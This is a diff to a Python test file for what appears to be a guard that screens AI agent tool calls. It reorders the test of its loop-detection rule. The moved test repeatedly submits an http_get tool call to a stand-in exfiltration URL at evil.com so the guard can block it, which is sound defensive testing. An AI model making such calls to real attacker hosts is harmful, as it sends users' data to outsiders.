@@ -268,16 +268,8 @@ async def test_invariant_engine(stub: pbg.ExtMcpStub) -> None:
         ))
     check("2 identical calls → allowed", r.WhichOneof("result") == "allowed")
 
-    # Many repeated identical calls → loop detection (threshold=3 in default rules)
-    for _ in range(10):
-        r = await stub.CheckRequest(pb.McpRequest(
-            method="tools/call",
-            mcp_request=json.dumps({"name": "http_get", "arguments": {"url": "http://evil.com/exfil"}}).encode(),
-        ))
-    is_blocked = r.WhichOneof("result") == "error"
-    print(f"  🔍 10x identical http_get → {'blocked' if is_blocked else 'allowed'} (loop rule threshold=3)")
-
-    # Different args should NOT trigger loop rule
+    # Different args should NOT trigger loop rule — test this BEFORE the
+    # repeated-identical-calls test so the trace window is clean.
     for i in range(6):
         r = await stub.CheckRequest(pb.McpRequest(
             method="tools/call",
@@ -286,6 +278,15 @@ async def test_invariant_engine(stub: pbg.ExtMcpStub) -> None:
     check("parameterized search (6x diff args) → allowed",
           r.WhichOneof("result") == "allowed",
           "different args must not trigger loop rule")
+
+    # Many repeated identical calls → loop detection (threshold=3 in default rules)
+    for _ in range(10):
+        r = await stub.CheckRequest(pb.McpRequest(
+            method="tools/call",
+            mcp_request=json.dumps({"name": "http_get", "arguments": {"url": "http://evil.com/exfil"}}).encode(),
+        ))
+    is_blocked = r.WhichOneof("result") == "error"
+    print(f"  🔍 10x identical http_get → {'blocked' if is_blocked else 'allowed'} (loop rule threshold=3)")
 
 
 async def test_concurrency(srv: Server) -> None:
